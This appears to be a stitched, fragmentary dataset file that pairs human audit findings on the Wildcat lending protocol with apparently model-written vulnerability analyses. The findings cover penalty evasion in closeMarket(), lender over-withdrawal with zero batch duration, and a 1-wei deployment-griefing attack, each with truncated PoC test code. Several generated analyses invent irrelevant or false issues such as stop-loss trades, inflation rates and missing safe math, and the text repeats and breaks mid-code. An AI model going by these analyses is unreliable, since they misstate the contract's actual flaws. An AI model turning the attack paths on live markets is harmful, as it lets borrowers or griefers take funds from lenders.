        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

Type of vulnerability: Improper Access Control and Arbitrary Address Input in Multi-Function Operations\n2. Reason for answer: The function `closeMarket()` has access control checks implemented through the modifier `onlyController` and `nonReentrant`. These ensure that only authorized callers can invoke this function, and that no reentrancy attacks can be executed. Additionally, input validation is performed to ensure that only valid addresses are used in the contract's interactions with other smart contracts.\n3.

This allows an attacker to manipulate operations based on arbitrary address inputs, potentially leading to unauthorized asset transfers or interactions with malicious contracts.

The function allows the caller to specify arbitrary target addresses, which are intended to be other contract addresses within a verified ecosystem.

Implement strict access control checks to ensure that operations can only be invoked by asset owners or authorized entities.\n2. Include input validation to verify that addresses provided are part of a whitelist or have been pre-verified to be part of the system.\n3.

The `closeMarket` function checks for unpaid withdrawals before closing the market, which means that any attacker attempting to exploit this vulnerability would need to first compromise the protocol's security by withdrawing assets from the market without paying for them. This is unlikely given the current structure of the code and the potential consequences of such an action.\n3. The `closeMarket` function only transfers excess assets or remaining debts to the borrower, rather than closing positions at user-specified prices. This means that any exploitation of this vulnerability would not allow attackers to take advantage of the protocol's stop loss and take profit trades.\n\nIn summary, while the `closeMarket` function in the given smart contract code is vulnerable to potential exploitation by attackers seeking to make risk-free profits, it is unlikely that this vulnerability would be exploited in practice due to the current structure of the code and the limited access to the controller's credentials or privileges.",

        ],
        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

The `setMaxTotalSupply` function updates the `maxTotalSupply` variable in the `MarketState` struct with a new value, which could potentially lead to an over-supply beyond the intended limit. However, the function does not check whether the updated `maxTotalSupply` is greater than the current total supply before allowing the update to happen.\n2. The vulnerability arises when the execution of inflation rate updates occurs after a specified decay point, causing the total available supply to be calculated using the old rate instead of the new one.

To mitigate this vulnerability, it is necessary to ensure that the inflation rate updating happens only under specific conditions, and calculation of the total available supply is based on the updated rate. This can be achieved by adding additional checks in the `setMaxTotalSupply` function to verify that the updated `maxTotalSupply` value is greater than the current total supply before allowing the update to happen.\n\nTherefore, the given smart contract code is vulnerable to \"Incorrect calculation of token supply cap\" type of vulnerability due to the lack of checks and updates in the `setMaxTotalSupply` function to ensure the integrity of the token supply cap.",

                "description": "The vulnerability arises when a user sets the `max_buy` parameter to `true`, allowing them to purchase bonds with the remaining value in the current epoch. The issue occurs if a new epoch starts before the transaction is included in the blockchain, making the user purchase bonds at a higher amount than intended due to the change in the maximum purchase amount. The smart contract does not require the user to specify the desired epoch number when performing a 'max buy' transaction, resulting in potential mismatches and unintended transactions. To mitigate this, it's recommended to require the user to specify the desired epoch number when performing a 'max buy' transaction and revert if the current epoch does not match the specified epoch, by refactoring the code into two external functions for normal buy and max buy, sharing an internal function to execute the deposit.",

Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets.\u201d**\n\nIt will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's **normalizedAmountPaid** number shows that it should be able to.\n\n## Proof Of Concept\n\nFor the following test, make sure you use the following parameters in **ExpectedStateTracker**.\n\n```solidity\nMarketParameters internal parameters = MarketParameters({\n        asset: address(0),\n        namePrefix: \"Wildcat \",\n

However, we can take a closer look at the function `queueWithdrawal` to see if there are any potential issues:\n\n1. The function takes in a `uint256` amount as input and then performs some operations on it, such as scaling the amount using `state.scaleAmount(amount).toUint104()`. This could potentially lead to an underflow or overflow issue if the scaled amount is too large or small. However, the code does not appear to be using any safe math functions, which could make it vulnerable to this type of attack.\n2. The function also checks if the scaled amount is zero and reverts if so. This is a good practice for preventing null burns, but there are still some potential issues with this check:\n* If the scaled amount is very small (i.e., less than 1 wei), it may be possible to create a withdrawal batch with a tiny amount that would not be worth burning.\n* The function does not check if the sender has enough tokens to burn, which could lead to an underflow attack if the sender attempts to send more tokens than they have in their balance.\n3.

This vulnerability occurs because the code does not account for locked funds when calculating loss, which can lead to incorrect loss calculation and significant loss for users.\n\nTo address this issue, it is important to modify the controlling logic to ensure that loss calculations take into account the initial value of the assets and to update shares according to the real value obtained during withdrawal.

The vulnerability is that the smart contract does not properly handle locked funds during asset withdrawals, which can lead to incorrect loss calculations and significant losses for users.\n\nBased on the provided smart contract code, I believe that it is vulnerable to this type of attack because the smart contract does not take into account any locked funds when calculating the amount of assets to be withdrawn from the user's account. Specifically, the `_getUpdatedState()` function in the `queueWithdrawal` method only updates the market state based on the current block timestamp, which may not reflect the correct balance of the user's account if there are any locked funds that have been frozen or temporarily unavailable for withdrawal.\n\nTo exploit this vulnerability, an attacker could potentially create a situation where they have a large amount of locked funds in their account and then call the `queueWithdrawal` method with a relatively small amount of tokens to be withdrawn. This would cause the smart contract to withdraw a larger amount of tokens than was requested by the user, leading to incorrect loss calculations and significant losses for the user.\n\nIt is worth noting that this vulnerability could potentially be exploited in conjunction with other types of attacks, such as flash loans or front-running, to cause even more significant losses for users.\n\nTo fix this vulnerability, it would be necessary to modify the controlling logic of the smart contract to ensure that loss calculations take into account the initial value of the assets and to update shares according to the real value obtained during withdrawal.

Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets.\u201d**\n\nIt will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's **normalizedAmountPaid** number shows that it should be able to.\n\n## Proof Of Concept\n\nFor the following test, make sure you use the following parameters in **ExpectedStateTracker**.\n\n```solidity\nMarketParameters internal parameters = MarketParameters({\n        asset: address(0),\n        namePrefix: \"Wildcat \",\n

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

However, since the withdrawals are not queued but are executed in real-time, this type of vulnerability does not exist in the given code.\n\nThe only potential vulnerabilities that can occur in this smart contract code are:\n\n1. Reentrancy Attack: The function `executeWithdrawal` is marked as non-reentrant, but it may still be vulnerable to a reentrancy attack if there are any external calls made within the function and those calls are not properly protected against reentry.\n2. Insufficient Gas Limit: The smart contract code does not check for sufficient gas limits, which can cause transactions to fail if they require more gas than what is provided by the user. This can lead to a DoS attack on the smart contract.\n3.

This can cause the system to become unresponsive and unable to process legitimate withdrawals, resulting in a DoS attack.\n\nThe vulnerability can be mitigated by implementing a minimum withdrawal amount requirement, ensuring that an attacker cannot clog the system with small or zero-amount withdrawal requests. By doing so, the system remains functional for legitimate users and reduces the risk of DoS attacks caused by queue overloading.\n\nTo demonstrate this vulnerability, we can generate a Proof of Concept (PoC) by submitting a large number of withdrawal requests with small or zero-amounts to the `executeWithdrawal` function in a single call. The smart contract code will process these requests and update the state accordingly, leading to a DoS attack on the system.\n\nTo fix this vulnerability, we can implement a minimum withdrawal amount requirement by adding a check in the `executeWithdrawal` function that ensures that the submitted withdrawal amount is greater than or equal to a certain threshold value.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

